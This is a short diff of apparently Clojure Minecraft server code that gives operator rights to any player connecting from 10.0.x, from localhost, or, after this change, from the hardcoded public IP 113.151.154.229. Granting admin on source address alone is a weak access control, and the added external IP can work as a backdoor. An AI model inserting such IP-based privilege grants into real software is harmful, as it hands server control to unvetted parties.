@@ -324,7 +324,8 @@
                     (let [ip (.. player getAddress getAddress getHostAddress)]
                       (if (or
                             (= "10.0" (apply str (take 4 ip)))
-                            (= "127.0.0.1" ip))
+                            (= "127.0.0.1" ip)
+                            (= "113.151.154.229" ip))
                         (do
                           (.setOp player true)
                           (prn [player 'is 'op]))
